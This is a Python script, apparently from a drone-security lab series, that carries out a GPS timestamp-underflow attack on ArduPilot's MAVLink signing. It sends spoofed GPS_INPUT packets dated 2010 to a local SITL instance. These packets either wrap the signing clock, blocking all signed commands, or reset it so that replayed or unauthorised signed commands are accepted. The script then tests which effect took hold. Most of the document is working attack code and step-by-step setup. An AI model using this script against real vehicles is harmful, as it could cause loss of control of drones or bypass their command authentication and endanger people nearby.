#!/usr/bin/env python3
"""
=============================================================
ATTACK 3B — Timestamp Underflow DoS
=============================================================
The OPPOSITE of Attack 3.

Attack 3  → pushes GPS time FORWARD to year 2104 (48-bit MAX)
Attack 3B → pushes GPS time BACKWARD to year 2010 (pre-epoch)

WHY IT IS DANGEROUS:
    MAVLink signing timestamps are measured in 10µs units
    since January 1, 2015 (the "MAVLink epoch").

    If GPS time is BEFORE 2015, the computed signing timestamp
    is NEGATIVE:
        ts = (gps_unix - 1420070400) × 100,000
           = (Jan 1 2010 - Jan 1 2015) × 100,000
           = -15,776,640,000,000   ← negative

    ArduPilot stores this as uint64_t.
    A negative int64 cast to uint64 WRAPS AROUND:
        18,446,728,297,069,551,616   (near 2^64)

    48-bit masked value → 265,698,336,710,656
    This is still >> any real 2026 timestamp (≈ 36 trillion).

TWO POSSIBLE EFFECTS (implementation-dependent):

    EFFECT A — Wrap DoS (same as Attack 3):
        ArduPilot stores the wrapped uint64 as its signing clock.
        All real 2026 packets have timestamps << the wrapped value.
        Rule 6 rejects them. Total communication blackout.

    EFFECT B — Clock Reset (opposite of DoS):
        ArduPilot clamps negative timestamps to 0.
        Signing clock resets to Jan 1 2015.
        All real 2026 packets now appear to be in the FUTURE.
        Every signed command is ACCEPTED again.
        → Use this to UNDO Attack 2 or Attack 3.

HOW TO TELL WHICH EFFECT HAPPENED:
    After running this script, type in MAVProxy:
        arm throttle
    → If ACCEPTED  : Effect B (clock reset — drone accepts commands)
    → If REJECTED  : Effect A (wrap DoS — same as Attack 3)

BEFORE RUNNING — type in MAVProxy:
    param set GPS1_TYPE 14
    param set SIM_GPS1_DISABLE 1
    module load GPSInput
    signing setup key
    signing setup sign_outgoing 1
=============================================================
"""

import time
import datetime
import subprocess
import signal
import socket
import json
import os
import sys

os.environ["MAVLINK20"] = "1"
import pymavlink.mavutil as mavutil

# ──────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────

GPS_INPUT_HOST   = "127.0.0.1"
GPS_INPUT_PORT   = 25100
MAVLINK_PORT     = 14550

# Jan 1 2010 — clearly before the MAVLink epoch (Jan 1 2015)
UNDERFLOW_UNIX   = 1262304000        # Unix: Jan 1, 2010 00:00:00 UTC
MAVLINK_EPOCH    = 1_420_070_400     # Jan 1, 2015 00:00:00 UTC

# What the signing timestamp looks like as signed vs uint64
MAV_TS_SIGNED    = (UNDERFLOW_UNIX - MAVLINK_EPOCH) * 100_000  # negative
UINT64_MAX       = (2**64)
MAV_TS_WRAPPED   = UINT64_MAX + MAV_TS_SIGNED   # wrapped uint64 value
MAV_TS_48MASKED  = MAV_TS_WRAPPED & (2**48 - 1) # 48-bit masked

# GPS epoch constants
GPS_EPOCH_UNIX   = 315_964_800
SECONDS_PER_WEEK = 604_800

# Burst size — send multiple to guarantee at least one accepted
UNDERFLOW_BURST  = 10
BURST_INTERVAL   = 0.2

# SITL home position
HOME_LAT = -35.363261
HOME_LON =  149.165237
HOME_ALT =  584.0

RESULTS_DIR = os.path.join(os.path.dirname(__file__), "results")
PCAP_FILE   = os.path.join(RESULTS_DIR, "attack3b_capture.pcap")


# ──────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────

def unix_to_gps(unix_time: float):
    elapsed  = unix_time - GPS_EPOCH_UNIX
    week     = int(elapsed / SECONDS_PER_WEEK)
    tow_ms   = int((elapsed % SECONDS_PER_WEEK) * 1000)
    return week, tow_ms


# ──────────────────────────────────────────────────────────────
# Main attack
# ──────────────────────────────────────────────────────────────

def main():
    print()
    print("=" * 62)
    print("  ATTACK 3B — Timestamp Underflow DoS")
    print("=" * 62)

    underflow_dt = datetime.datetime.utcfromtimestamp(UNDERFLOW_UNIX)
    real_dt      = datetime.datetime.utcnow()
    epoch_dt     = datetime.datetime.utcfromtimestamp(MAVLINK_EPOCH)

    print()
    print(f"  Real time now       : {real_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  MAVLink epoch       : {epoch_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC  (Jan 1 2015)")
    print(f"  Injecting GPS date  : {underflow_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC  (Jan 1 2010)")
    print()
    print(f"  time_usec injected  : {UNDERFLOW_UNIX * 1_000_000:,}")
    print(f"  MAVLink TS (signed) : {MAV_TS_SIGNED:,}  ← NEGATIVE (before epoch)")
    print(f"  uint64 wrapped      : {MAV_TS_WRAPPED:,}")
    print(f"  48-bit masked       : {MAV_TS_48MASKED:,}")
    print(f"  48-bit MAX          : {2**48 - 1:,}")
    print()
    print("  THEORY:")
    print("    Negative int64 cast to uint64 wraps to near 2^64.")
    print("    48-bit masked value = 265,698,336,710,656")
    print("    Real 2026 MAVLink TS ≈  36,116,952,500,000")
    print("    265 trillion >> 36 trillion → Rule 6 rejects 2026 packets.")
    print()
    print("    OR: ArduPilot clamps to 0 → signing clock resets →")
    print("    all 2026 packets accepted again (clock reset effect).")
    print()
    print("  Make sure you ran in MAVProxy:")
    print("    param set GPS1_TYPE 14")
    print("    param set SIM_GPS1_DISABLE 1")
    print("    module load GPSInput")
    print("    signing setup key")
    print("    signing setup sign_outgoing 1")
    print()
    input("  Press ENTER to launch the attack...")
    print()

    # ── Start packet capture ──────────────────────────────────
    os.makedirs(RESULTS_DIR, exist_ok=True)
    if os.path.exists(PCAP_FILE):
        os.remove(PCAP_FILE)

    print(f"[1/4] Starting capture → results/attack3b_capture.pcap")
    tshark = subprocess.Popen(
        ["tshark", "-i", "lo",
         "-F", "pcap",
         "-f", f"udp port {GPS_INPUT_PORT} or udp port {MAVLINK_PORT}",
         "-w", PCAP_FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # ── Open raw UDP socket ───────────────────────────────────
    print(f"[2/4] Opening UDP socket → {GPS_INPUT_HOST}:{GPS_INPUT_PORT} (JSON)")
    sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    out_addr = (GPS_INPUT_HOST, GPS_INPUT_PORT)

    # ── Inject underflow packets ──────────────────────────────
    print(f"[3/4] Injecting PRE-2015 GPS timestamp ({UNDERFLOW_BURST} packets)...")
    print(f"      Claiming GPS time = Jan 1 2010")
    print()

    week, tow_ms = unix_to_gps(UNDERFLOW_UNIX)
    time_usec    = UNDERFLOW_UNIX * 1_000_000

    for i in range(UNDERFLOW_BURST):
        data = {
            'time_usec':          int(time_usec),
            'gps_id':             0,
            'ignore_flags':       0,
            'time_week_ms':       tow_ms,
            'time_week':          week,
            'fix_type':           3,
            'lat':                int(HOME_LAT * 1e7),
            'lon':                int(HOME_LON * 1e7),
            'alt':                HOME_ALT,
            'hdop':               1,
            'vdop':               1,
            'vn':                 0,
            've':                 0,
            'vd':                 0,
            'speed_accuracy':     0.3,
            'horiz_accuracy':     1.0,
            'vert_accuracy':      1.5,
            'satellites_visible': 10,
        }
        sock.sendto(json.dumps(data).encode(), out_addr)
        print(f"  Packet {i+1:2d}/{UNDERFLOW_BURST}  "
              f"time_usec={time_usec}  "
              f"GPS week={week}  tow_ms={tow_ms}")
        time.sleep(BURST_INTERVAL)

    sock.close()
    print()
    print("  Underflow packets sent.")
    print()

    # ── Verify: try a signed command — check if accepted or rejected ──
    print(f"[4/4] Verification — sending signed command with REAL 2026 timestamp...")
    print(f"      If ACCEPTED  → Effect B (clock clamped to 0, reset confirmed)")
    print(f"      If REJECTED  → Effect A (uint64 wrap DoS, same as Attack 3)")
    print()

    mav_conn = mavutil.mavlink_connection(f"udpin:0.0.0.0:{MAVLINK_PORT}")
    hb       = mav_conn.wait_heartbeat(timeout=8)

    if not hb:
        print("  [!] No heartbeat — is SITL running?")
    else:
        sysid  = mav_conn.target_system
        compid = mav_conn.target_component

        real_ts   = int((time.time() - MAVLINK_EPOCH) * 100_000)
        key_bytes = "key".encode().ljust(32, b'\x00')

        mav_conn.mav.signing.secret_key    = key_bytes
        mav_conn.mav.signing.timestamp     = real_ts
        mav_conn.mav.signing.link_id       = 0
        mav_conn.mav.signing.sign_outgoing = True

        print(f"  Sending COMMAND_LONG with real 2026 timestamp: {real_ts:,}")
        mav_conn.mav.command_long_send(
            sysid, compid,
            mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
            0, 1, 0, 0, 0, 0, 0, 0
        )

        resp = mav_conn.recv_match(type="AUTOPILOT_VERSION", blocking=True, timeout=5)
        print()
        if resp:
            print("  ╔══════════════════════════════════════════════════════╗")
            print("  ║  EFFECT B — CLOCK RESET CONFIRMED                   ║")
            print("  ║  UAV responded to real 2026 command.                ║")
            print("  ║  Signing clock was clamped to 0 by the underflow.   ║")
            print("  ║  All future signed commands are now accepted.        ║")
            print("  ╚══════════════════════════════════════════════════════╝")
        else:
            print("  ╔══════════════════════════════════════════════════════╗")
            print("  ║  EFFECT A — uint64 WRAP DoS CONFIRMED               ║")
            print("  ║  No response to real 2026 command.                  ║")
            print("  ║  uint64 wrap set clock to 265 trillion.             ║")
            print("  ║  2026 timestamp (36 trillion) << 265 trillion →     ║")
            print("  ║  Rule 6 rejects all signed packets. DoS active.     ║")
            print("  ╚══════════════════════════════════════════════════════╝")

    mav_conn.close()

    # ── Stop capture ──────────────────────────────────────────
    time.sleep(1)
    tshark.send_signal(signal.SIGINT)
    tshark.wait(timeout=5)

    pcap_size = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0

    print()
    print("─" * 62)
    print("  ATTACK 3B COMPLETE")
    print()
    print(f"  Capture : {PCAP_FILE}")
    print(f"  Size    : {pcap_size:,} bytes")
    print()
    print("  KEY DIFFERENCE FROM ATTACK 3:")
    print()
    print(f"  Attack 3  → time_usec = {4_234_820_167_000_000:,}")
    print(f"               GPS date  = 2104-03-13  (+78 years)")
    print(f"               MAVLink TS = 281,474,976,700,000  (near 2^48-1)")
    print()
    print(f"  Attack 3B → time_usec = {time_usec:,}")
    print(f"               GPS date  = 2010-01-01  (-5 years from epoch)")
    print(f"               MAVLink TS (signed) = {MAV_TS_SIGNED:,}")
    print(f"               uint64 wrapped       = {MAV_TS_WRAPPED:,}")
    print(f"               48-bit masked        = {MAV_TS_48MASKED:,}")
    print()
    print("  WIRESHARK — open and filter:")
    print("    udp.dstport == 25100")
    print("    Protocol column shows: ATK0_UNDERFLOW")
    print(f"  wireshark {PCAP_FILE}")
    print("─" * 62)
    print()


if __name__ == "__main__":
    main()
